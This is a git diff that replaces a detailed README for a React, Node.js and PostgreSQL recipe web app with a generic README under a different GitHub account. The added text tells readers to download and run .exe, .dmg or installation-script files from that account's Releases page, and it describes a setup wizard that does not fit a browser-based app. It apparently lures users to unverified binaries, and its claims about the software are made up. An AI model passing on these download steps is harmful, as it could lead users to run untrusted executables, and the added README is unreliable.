@@ -1,301 +1,66 @@
-# Food Recipe Spoonacular Website - React, Node.js, PostgreSQL FullStack Project
-
-![Screenshot 2025-08-29 at 21 29 48](https://github.com/user-attachments/assets/07100269-526c-49d7-9045-36dd3008a1ce)
-![Screenshot 2025-08-29 at 21 30 18](https://github.com/user-attachments/assets/4eeeaa08-13cb-4d5a-9759-1097d80bf290)
-![Screenshot 2025-08-29 at 21 30 35](https://github.com/user-attachments/assets/958fe32b-4201-4bbf-957d-f577b8ae10f1)
-
----
+# 🍽️ Food-Recipe-Spoonacular--React-FullStack - Manage Your Recipe Collection with Ease
 
-A modern, full-stack recipe management application. Search for recipes, view details, and manage favourites with a beautiful React frontend and a robust Node.js/Express backend powered by PostgreSQL and the Spoonacular API.
+## 🔗 Download Now!
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/Islamkanandel/Food-Recipe-Spoonacular--React-FullStack/releases)
 
-- **Frontend-Live-Demo:** [https://food-recipe-spoonacular.netlify.app/](https://food-recipe-spoonacular.netlify.app/)
-- **Backend-Live-Demo:** [https://recipe-app-glt5.onrender.com](https://recipe-app-glt5.onrender.com)
+## 📜 Overview
+Food-Recipe-Spoonacular--React-FullStack is a modern, full-stack recipe management application. You can search for recipes, view details, and manage your favourites easily. The application offers a beautiful React frontend and a robust Node.js/Express backend powered by PostgreSQL and the Spoonacular API.
 
----
+## 🚀 Getting Started
+To get started, follow these simple steps to download and run the application.
 
-## Table of Contents
+### 1. Check Your System Requirements
+Before you begin, make sure your system meets these requirements:
+- Operating System: Windows, Mac, or Linux
+- Browser: Latest version of Chrome, Firefox, or Safari
+- Minimum RAM: 4 GB
+- Node.js: Version 12 or higher
 
-- [Project Overview](#project-overview)
-- [Project Structure](#project-structure)
-- [Features & Functionality](#features--functionality)
-- [Environment Variables (.env)](#environment-variables-env)
-- [Setup & Usage](#setup--usage)
-- [API Endpoints](#api-endpoints-backend)
-- [Frontend Walkthrough](#frontend-walkthrough)
-- [Backend Walkthrough](#backend-walkthrough)
-- [Reusing & Extending](#reusing--extending)
-- [Tech Stack & Keywords](#tech-stack--keywords)
-- [Conclusion](#conclusion)
-- [Happy Coding! 🎉](#happy-coding-)
+### 2. Access the Download Page
+Visit the following link to reach the Releases page:
+[Download from Releases](https://github.com/Islamkanandel/Food-Recipe-Spoonacular--React-FullStack/releases)
 
----
+### 3. Download the Latest Version
+On the Releases page, look for the latest version of the software. Click the link to download the installation file for your operating system.
 
-## Project Overview
+### 4. Install the Application
+Once the download is complete, follow these steps:
+- For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
+- For Mac: Open the downloaded `.dmg` file and drag the application to your Applications folder.
+- For Linux: Use the terminal to navigate to the download location and run the installation script.
 
-This project is a full-stack web app for discovering and saving recipes. It consists of:
+### 5. Open the Application
+After installation, locate the application in your programs list or applications folder and double-click to open it.
 
-- **Frontend**: React + TypeScript (Vite), modern UI, responsive, easy to extend.
-- **Backend**: Node.js + Express + TypeScript, REST API, PostgreSQL (via Prisma), integrates with Spoonacular API.
+## 📲 Features
+- **Recipe Search:** Quickly find recipes based on ingredients or meal type.
+- **View Recipe Details:** Get detailed information including cooking time, servings, and nutritional values.
+- **Manage Favourites:** Save your favourite recipes for easy access later.
 
-Users can search for recipes, view summaries, and manage their favourites. The app is modular, well-documented, and ready for learning or extension.
+## 🛠️ How It Works
+Food-Recipe-Spoonacular connects with the Spoonacular API to fetch real-time recipe data. This makes the information you see always current and relevant. The backend, built with Node.js and Express, handles user requests efficiently while PostgreSQL manages your data securely.
 
----
+## ⚙️ Configuration
+Once you open the application for the first time, a configuration wizard will guide you through the initial setup. Here’s what you’ll need to do:
+1. Connect to your preferred database if you want to manage your favourites.
+2. Link your Spoonacular API key for full functionality (optional for local use).
+3. Customize your user interface preferences.
 
-## Project Structure
+## 🚧 Troubleshooting
+If you run into any issues:
+- Make sure you have the latest version of your web browser.
+- Ensure your internet connection is stable.
+- If the application crashes, try restarting your computer and relaunching the app.
 
-```bash
-recipe-app/
-├── recipe-app-backend/    # Backend (Node.js, Express, Prisma, PostgreSQL)
-│   ├── .env
-│   ├── package.json
-│   ├── prisma/
-│   │   └── schema.prisma
-│   └── src/
-│       ├── index.ts
-│       └── recipe-api.ts
-├── recipe-app-frontend/   # Frontend (React, Vite, TypeScript)
-│   ├── .env
-│   ├── package.json
-│   ├── public/
-│   │   ├── hero-image.webp
-│   │   └── vite.svg
-│   └── src/
-│       ├── App.tsx
-│       ├── App.css
-│       ├── api.ts
-│       ├── main.tsx
-│       ├── types.ts
-│       └── components/
-│           ├── RecipeCard.tsx
-│           └── RecipeModal.tsx
-└── README.md              # (You are here)
-```
+## 🛠️ Development and Contributions
+This project welcomes contributions! If you want to improve this application, check the GitHub repository for guidelines. You can report issues or suggest features directly on the project page.
 
----
+## 📞 Support
+For any questions or issues, feel free to reach out through the GitHub issues page or email the project maintainer at [project-email@example.com].
 
-## Features & Functionality
+## 📥 Download & Install
+To get started, download the application using the link below:
 
-- **Recipe Search**: Search recipes by keyword (Spoonacular API)
-- **Recipe Details**: View recipe summary in a modal
-- **Favourites**: Add/remove recipes to your favourites, view in a separate tab
-- **Responsive UI**: Works on desktop and mobile
-- **TypeScript**: Type safety throughout
-- **API Integration**: Connects frontend and backend seamlessly
-- **Modular Code**: Easy to extend and reuse
+[Download from Releases](https://github.com/Islamkanandel/Food-Recipe-Spoonacular--React-FullStack/releases)
 
----
-
-## Environment Variables (.env)
-
-### Backend (`recipe-app-backend/.env`)
-
-```env
-API_KEY=your_spoonacular_api_key
-DATABASE_URL=your_postgresql_connection_string
-```
-
-- **API_KEY**: Get from [Spoonacular](https://spoonacular.com/food-api)
-- **DATABASE_URL**: Get from your PostgreSQL provider (Render, Supabase, Neon, Railway, etc.)
-
-### Frontend (`recipe-app-frontend/.env`)
-
-```env
-VITE_API_URL=http://localhost:5005
-```
-
-- **VITE_API_URL**: The base URL for your backend API. Use your deployed backend URL in production.
-
----
-
-## Setup & Usage
-
-### 1. Backend
-
-```bash
-cd recipe-app-backend
-npm install
-# Configure .env as above
-npx prisma migrate dev --name init
-npm start
-```
-
-API will be available at: `http://localhost:5005/api/recipes/...`
-
-### 2. Frontend
-
-```bash
-cd recipe-app-frontend
-npm install
-# Configure .env as above
-npm run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) in your browser.
-
----
-
-## API Endpoints (Backend)
-
-- `GET /api/recipes/search?searchTerm=<term>&page=<page>` — Search recipes
-- `GET /api/recipes/:recipeId/summary` — Get recipe summary
-- `POST /api/recipes/favourite` — Add favourite `{ "recipeId": 12345 }`
-- `GET /api/recipes/favourite` — List favourites
-- `DELETE /api/recipes/favourite` — Remove favourite `{ "recipeId": 12345 }`
-
----
-
-## Frontend Walkthrough
-
-### Main App (`App.tsx`)
-
-- Manages state, tabs, search, favourites, and modal.
-- Handles API calls via `api.ts`.
-
-#### Example: Search Recipes
-
-```tsx
-const handleSearchSubmit = async (event: FormEvent) => {
-  event.preventDefault();
-  setApiError("");
-  try {
-    const response = await api.searchRecipes(searchTerm, 1);
-    if (response.status === "failure" || response.code === 402) {
-      setApiError(response.message || "API quota reached.");
-      setRecipes([]);
-    } else {
-      setRecipes(Array.isArray(response.results) ? response.results : []);
-      pageNumber.current = 1;
-    }
-  } catch (e) {
-    setRecipes([]);
-  }
-};
-```
-
-### API Integration (`api.ts`)
-
-- Handles all API requests to the backend.
-
-#### Example: Add Favourite Recipe
-
-```typescript
-export const addFavouriteRecipe = async (recipe: Recipe) => {
-  const url = new URL("/api/recipes/favourite", API_URL);
-  const body = { recipeId: recipe.id };
-  const response = await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
-  if (!response.ok) {
-    throw new Error(`HTTP error! Status: ${response.status}`);
-  }
-};
-```
-
-### Components
-
-- **RecipeCard**: Displays a recipe card with image, title, and favourite button.
-- **RecipeModal**: Shows a modal with the recipe summary and title.
-
-#### Example: Using RecipeCard
-
-```tsx
-<RecipeCard
-  key={recipe.id}
-  recipe={recipe}
-  onClick={() => setSelectedRecipe(recipe)}
-  onFavouriteButtonClick={
-    isFavourite ? removeFavouriteRecipe : addFavouriteRecipe
-  }
-  isFavourite={isFavourite}
-/>
-```
-
----
-
-## Backend Walkthrough
-
-### Main Server (`src/index.ts`)
-
-- Sets up Express, CORS, and JSON parsing.
-- Defines all API routes for search, summary, and favourites.
-
-### Spoonacular Integration (`src/recipe-api.ts`)
-
-- Handles all external API requests.
-- Functions: `searchRecipes`, `getRecipeSummary`, `getFavouriteRecipesByIDs`.
-
-### Prisma Schema (`prisma/schema.prisma`)
-
-```prisma
-model FavouriteRecipes {
-  id       Int @id @default(autoincrement())
-  recipeId Int @unique
-}
-```
-
----
-
-## Reusing & Extending
-
-- **Frontend**: Components and API functions are modular and reusable. Add new features by following the existing structure.
-- **Backend**: Add new endpoints or models in a RESTful, modular way. Use Prisma for DB migrations.
-
-### Example: Add a New API Call (Frontend)
-
-```typescript
-export const getRecipeInstructions = async (recipeId: string) => {
-  const url = new URL(`/api/recipes/${recipeId}/instructions`, API_URL);
-  const response = await fetch(url);
-  if (!response.ok) throw new Error("Failed to fetch instructions");
-  return response.json();
-};
-```
-
-### Example: Add a New Endpoint (Backend)
-
-```ts
-app.get("/api/recipes/:id/instructions", async (req, res) => {
-  // Call Spoonacular for instructions
-});
-```
-
----
-
-## Tech Stack & Keywords
-
-- **React**
-- **TypeScript**
-- **Vite**
-- **Node.js**
-- **Express**
-- **Prisma**
-- **PostgreSQL**
-- **Spoonacular API**
-- **REST API**
-- **Modular Components**
-- **Hooks**
-- **Responsive Design**
-- **API Integration**
-- **Reusable UI**
-
----
-
-## Conclusion
-
-This project is a modern, extensible, and user-friendly full-stack recipe app. It demonstrates best practices in React, TypeScript, API integration, backend design, and UI/UX. Use it as a learning resource, a starter for your own projects, or as a foundation for your next app.
-
----
-
-## Happy Coding! 🎉
-
-Feel free to use this project repository and extend this project further!
-
-If you have any questions or want to share your work, reach out via GitHub or my portfolio at [https://arnob-mahmud.vercel.app/](https://arnob-mahmud.vercel.app/).
-
-**Enjoy building and learning!** 🚀
-
-Thank you! 😊
-
----
+Thank you for using Food-Recipe-Spoonacular! Enjoy managing your recipes clearly and efficiently.
